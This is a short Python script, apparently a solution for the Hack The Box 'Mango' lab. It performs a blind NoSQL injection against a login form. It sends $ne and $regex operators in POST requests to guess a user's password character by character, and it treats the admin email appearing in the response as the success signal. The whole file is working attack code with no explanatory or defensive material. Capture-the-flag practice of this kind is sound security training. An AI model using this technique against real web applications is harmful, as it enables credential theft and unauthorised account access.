#!/usr/bin/env python3
import requests
import string
import re
ARG1 = "username[$ne]"
ARG2 = "password[$regex]"
arg1 = "hacker"
page = "http://staging-order.mango.htb/"

dictionnary = list(string.printable)
password_length = 16
password = ""
error = False

for j in range(1, password_length+1):

    i = 0
    char_found = False

    while char_found == False and i < len(dictionnary):
        if j == (password_length+1):
            arg2 = password + dictionnary[i]
        else:
            arg2 = re.escape(password + dictionnary[i]) + ".{" + str(password_length-j) + "}"
        arguments = {ARG1: arg1, ARG2: arg2}
        results = requests.post(page, data=arguments)
        print("[*] Test password : " + password + dictionnary[i], end='\r')

        if "admin@mango.htb" in results.text:
            char_found = True
            password += dictionnary[i]

        i = i + 1

    if char_found == False:
        print("[x] Error : a char was not found. Check your dictionnary.")
        print("[*] Start of password : " + password)
        print("[*] " + str(len(password)) + "/" + str(password_length) + " letters found")
        error = True
        break

if error == False:
    print("\n[+] Password found : " + password)